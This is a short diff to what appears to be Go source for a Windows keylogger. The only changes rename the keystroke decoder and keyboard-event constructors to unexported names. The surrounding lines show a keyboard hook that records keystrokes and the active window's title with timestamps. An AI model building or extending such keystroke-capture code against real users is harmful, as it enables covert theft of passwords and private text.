@@ -10,7 +10,7 @@ import (
 )
 
 type KeyLogger struct {
-	Decoder            *KeyStrokeDecoder
+	Decoder            *keyStrokeDecoder
 	input              chan *KeyboardEvent
 	previousWindowName string
 }
@@ -18,7 +18,7 @@ type KeyLogger struct {
 func NewKeylogger(output chan string) *KeyLogger {
 	kl := &KeyLogger{}
 	kl.input = make(chan *KeyboardEvent)
-	kl.Decoder = NewKeyStrokeDecoder(kl.input, output)
+	kl.Decoder = newKeyStrokeDecoder(kl.input, output)
 	return kl
 }
 
@@ -43,6 +43,6 @@ func (kl *KeyLogger) hook(nCode int, wParam types.WPARAM, lParam types.LPARAM) t
 		kl.Decoder.output <- fmt.Sprintf("\n%s - %s\n", time.Now().Local().String(), windowName)
 	}
 
-	kl.input <- NewKeyboardEvent(wParam, lParam, layout)
+	kl.input <- newKeyboardEvent(wParam, lParam, layout)
 	return user32.CallNextHookEx(0, nCode, wParam, lParam)
 }
